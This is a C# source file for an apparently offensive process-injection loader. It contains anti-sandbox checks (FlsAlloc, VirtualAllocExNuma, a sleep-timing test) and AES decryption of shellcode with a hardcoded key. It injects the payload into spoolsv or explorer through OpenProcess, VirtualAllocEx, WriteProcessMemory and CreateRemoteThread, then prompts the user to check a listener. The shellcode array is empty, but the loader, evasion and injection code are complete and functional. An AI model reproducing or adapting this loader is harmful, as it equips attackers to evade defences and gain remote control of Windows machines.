using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Runtime.InteropServices;
using System.IO;
using System.Diagnostics;
using System.Security.Cryptography;
using System.Net;
using System.Security.Principal;

namespace Inject
{
    class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 FlsAlloc(IntPtr lpCallback);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 128;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.PKCS7;
                aes.Mode = CipherMode.CBC;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return GetDecrypt(CEncryptedShell, decryptor);
                }
            }
        }

        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(data, 0, data.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        static void Main(string[] args)
        {
            UInt32 result = FlsAlloc(IntPtr.Zero);
            if (result != 0xFFFFFFFF)
            {
                IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
                if (mem == null)
                {
                    return;
                }

                DateTime t1 = DateTime.Now;
                Sleep(2000);
                double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
                if (t2 < 1.5)
                {
                    return;
                }

                // Parse arguments, if given (process to inject)
                String procName = "";
                if (args.Length == 1)
                {
                    procName = args[0];
                }
                else if (args.Length == 0)
                {
                    // Inject based on elevation level
                    if (IsElevated)
                    {
                        Console.WriteLine("Process is elevated.");
                        procName = "spoolsv";
                    }
                    else
                    {
                        Console.WriteLine("Process is not elevated.");
                        procName = "explorer";
                    }
                }
                else
                {
                    Console.WriteLine("Please give either one argument for a process to inject, e.g. \".\\Inject.exe explorer\", or leave empty for auto-injection.");
                    return;
                }

                // Decode the payload
                byte[] Key = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");
                byte[] IV = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");

                // Copy AES-Encrypted Shellcode Here :
                byte[] buf = new byte[] { };
                
                byte[] DShell = AESDecrypt(buf, Key, IV);
                StringBuilder hexCodes = new StringBuilder(DShell.Length * 2);
                foreach (byte b in DShell)
                {
                    hexCodes.AppendFormat("0x{0:x2},", b);
                }
                int len = DShell.Length;

                Console.WriteLine($"Attempting to inject into {procName} process...");

                // Get process IDs
                Process[] expProc = Process.GetProcessesByName(procName);

                // If multiple processes exist, try to inject in all of them
                for (int i = 0; i < expProc.Length; i++)
                {
                    int pid = expProc[i].Id;

                    // Get a handle on the process
                    IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                    if ((int)hProcess == 0)
                    {
                        Console.WriteLine($"Failed to get handle on PID {pid}.");
                        continue;
                    }
                    Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                    // Allocate memory in the remote process
                    IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                    Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                    // Write the payload to the allocated bytes
                    IntPtr bytesWritten;
                    bool procMemResult = WriteProcessMemory(hProcess, expAddr, DShell, len, out bytesWritten);
                    Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                    IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                    Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                    break;
                }
            }
        }
    }
}